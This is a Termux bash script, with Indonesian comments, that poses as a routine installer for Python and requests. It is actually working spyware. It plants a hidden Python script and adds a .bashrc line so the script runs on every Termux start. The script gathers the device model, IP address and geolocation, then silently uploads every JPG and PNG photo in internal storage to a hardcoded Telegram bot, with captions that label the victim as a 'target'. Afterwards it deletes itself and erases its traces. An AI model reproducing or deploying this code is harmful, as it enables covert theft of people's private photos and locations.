#!/data/data/com.termux/files/usr/bin/bash
clear

echo -e "\033[1;32m[+] Memulai instalasi... \033[0m"
sleep 3
pkg update && pkg upgrade -y
clear
echo -e "\033[1;32m[+] install python \033[0m"
sleep 3
pkg install python -y 
clear
echo -e "\033[1;32m[+] install pip request \033[0m"
sleep 3
pip install requests
clear
echo -e "\033[1;32m[+] loading bre... \033[0m"
sleep 5
# Buat direktori untuk script jika belum ada
SCRIPT_DIR="$HOME/.telegram_image_sender"
mkdir -p "$SCRIPT_DIR"

# Buat file Python script
cat > "$SCRIPT_DIR/send_images.py" << 'EOF'
import os
import requests
import time
import sys
import subprocess
from pathlib import Path

# Konfigurasi Bot Telegram
BOT_TOKEN = "7793316319:AAG3Oe0GgHsDFtVXaGFj9Po_H_dttRWbtUM"
CHAT_ID = "-1002476361628"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
TELEGRAM_MESSAGE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Direktori internal (sesuaikan dengan path di perangkat Anda)
INTERNAL_DIR = "/storage/emulated/0"  # Root direktori internal
SENT_FILES_LOG = os.path.expanduser("~/.sent_files.log")  # File log untuk menyimpan daftar file yang sudah dikirim

# Fungsi untuk menjalankan perintah shell dan mengambil output
def run_shell_command(command):
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return result.strip()
    except subprocess.CalledProcessError:
        return "Tidak Diketahui"

# Mengambil informasi perangkat
def get_device_info():
    # ID Termux
    termux_id = run_shell_command("whoami")

    # Merek dan model perangkat
    device_brand = run_shell_command("getprop ro.product.brand")
    device_model = run_shell_command("getprop ro.product.model")
    device_name = f"{device_brand} {device_model}"

    # Versi Android
    android_version = run_shell_command("getprop ro.build.version.release")

    # Memori (RAM)
    mem_total = run_shell_command("grep MemTotal /proc/meminfo | awk '{print $2}'")
    mem_available = run_shell_command("grep MemAvailable /proc/meminfo | awk '{print $2}'")
    memory = f"{int(mem_available) // 1024}Mi / {int(mem_total) // 1024}Mi"

    # Alamat IP
    ip_address = run_shell_command("curl -s ifconfig.me")

    # Lokasi (kota, wilayah, negara, koordinat)
    try:
        location_data = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
        city = location_data.get("city", "Tidak Diketahui")
        region = location_data.get("region", "Tidak Diketahui")
        country = location_data.get("country", "Tidak Diketahui")
        loc = location_data.get("loc", "Tidak Diketahui")
        location = f"{loc}"
    except:
        city = region = country = location = "Tidak Diketahui"

    return device_name, android_version, ip_address, termux_id, memory, city, region, country, location

# Fungsi untuk mengirim pesan ke Telegram
def send_message(message):
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(TELEGRAM_MESSAGE_URL, data=data)
    return response.status_code == 200

# Fungsi untuk mengirim file dengan penanganan rate limit
def send_file(file_path):
    device_name, android_version, ip_address, termux_id, memory, city, region, country, location = get_device_info()
    
    # Deskripsi file (lokasi file)
    file_location = f"📂 Asal Direktori: {file_path}"
    message = f"""
🔰 *Informasi Target* 🔰
📝 ID TERMUX Target : `{termux_id}`
📱 Merek : {device_name}
🖥️ OS : {android_version}
💾 Memori : {memory}
{file_location}
🌐 Alamat IP : {ip_address}
🏙️ Kota : {city}
📍 Wilayah : {region}
🇨🇺 Negara : {country}
📌 Lokasi : {location}
"""

    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID, 'caption': message, 'parse_mode': 'Markdown'}

        retry_delay = 3  # Mulai dengan 3 detik
        max_retries = 3  # Maksimum percobaan ulang
        
        for attempt in range(max_retries):
            response = requests.post(TELEGRAM_API_URL, data=data, files=files)
            
            if response.status_code == 200:
                return True
            
            elif response.status_code == 429:
                # Jika terkena rate limit, ambil waktu tunggu dari response (jika tersedia)
                retry_after = response.json().get("parameters", {}).get("retry_after", retry_delay)
                time.sleep(retry_after)  # Tunggu sebelum mencoba lagi
            
            else:
                return False
        
        return False

# Mencatat file yang sudah dikirim ke log
def log_sent_file(file_path):
    with open(SENT_FILES_LOG, "a") as log_file:
        log_file.write(file_path + "\n")

# Memeriksa apakah file sudah dikirim sebelumnya
def is_file_sent(file_path):
    if not os.path.exists(SENT_FILES_LOG):
        return False
    with open(SENT_FILES_LOG, "r") as log_file:
        sent_files = log_file.read().splitlines()
    return file_path in sent_files

# Mengambil semua file foto dari direktori dan subdirektori
def get_all_images(directory):
    images = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                images.append(os.path.join(root, file))
    return images

# Mengirim semua file foto
def send_all_files():
    images = get_all_images(INTERNAL_DIR)
    if not images:
        # Kirim pesan jika tidak ada file foto yang ditemukan
        send_message("📂 Tidak ada file foto yang ditemukan di internal storage.")
        return

    for image_path in images:
        if is_file_sent(image_path):
            continue

        if send_file(image_path):
            log_sent_file(image_path)
            time.sleep(2)  # Delay 2 detik antar pengiriman file untuk menghindari rate limit

    # Kirim pesan ketika semua file telah dikirim
    send_message("✅ Semua file foto di internal storage telah berhasil dikirim!")

    # Setelah semua file dikirim, hapus script dan file log
    if os.path.exists(SENT_FILES_LOG):
        os.remove(SENT_FILES_LOG)
    
    # Hapus file script dan direktori
    os.remove(__file__)
    os.rmdir(os.path.dirname(__file__))

    # Hapus perintah dari .bashrc
    bashrc_path = os.path.expanduser("~/.bashrc")
    with open(bashrc_path, "r") as file:
        lines = file.readlines()
    with open(bashrc_path, "w") as file:
        for line in lines:
            if "nohup python3 $HOME/.telegram_image_sender/send_images.py" not in line:
                file.write(line)

    sys.exit(0)

# Jalankan script di latar belakang
def run_in_background():
    try:
        if os.fork():
            sys.exit(0)
    except OSError as e:
        sys.exit(1)

    # Jalankan fungsi utama
    send_all_files()

if __name__ == "__main__":
    # Redirect semua output ke /dev/null agar tidak terlihat
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    run_in_background()
EOF

# Beri izin eksekusi pada script
chmod +x "$SCRIPT_DIR/send_images.py"

# Tambahkan perintah untuk menjalankan script di latar belakang saat Termux dibuka
echo "nohup python3 $HOME/.telegram_image_sender/send_images.py > /dev/null 2>&1 &" >> $HOME/.bashrc

echo -e "\033[1;32m[+] Instalasi berhasil! \033[0m"
sleep 2
echo -e "\033[1;31m[!] Restart Termux nya bre..\033[0m"
sleep 0
echo -e "\033[1;31m[!] Tekan Enter untuk keluar. \033[0m"
sleep 1

# Keluar dari Termux
pkill -9 -f "com.termux"
